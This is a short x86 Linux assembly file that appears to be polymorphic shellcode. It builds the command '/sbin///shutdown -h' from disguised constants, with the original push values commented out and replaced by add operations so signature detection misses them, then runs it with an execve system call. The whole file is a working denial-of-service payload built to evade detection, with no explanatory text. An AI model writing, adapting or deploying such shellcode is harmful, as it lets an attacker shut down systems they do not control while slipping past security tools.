
global _start			

section .text
_start:

	xor    eax,eax
	xor    edx,edx
	push   eax
	push word 0x682d
	mov    edi,esp
	push   eax
	push   0x6e
	mov    WORD [esp+0x1],0x776f
	mov    edi,esp
	push   eax
	;push   0x6e776f64
	mov    eax,0x5d665e53
	add    eax,0x11111111
	push   eax
	;push   0x74756873
	mov    eax,0x52534651
	add    eax,0x22222222
	push   eax
	;push   0x2f2f2f6e
	mov    eax,0x1e1e1e5d
	add    eax,0x11111111
	push   eax 
	;push   0x6962732f
	mov    eax, 0x5851621e
	add    eax, 0x11111111
	push   eax
	mov    ebx,esp
	push   edx
	push   esi
	push   edi
	push   ebx
	mov    ecx,esp
	xor    eax, eax
	mov    al,0xb
	int    0x80





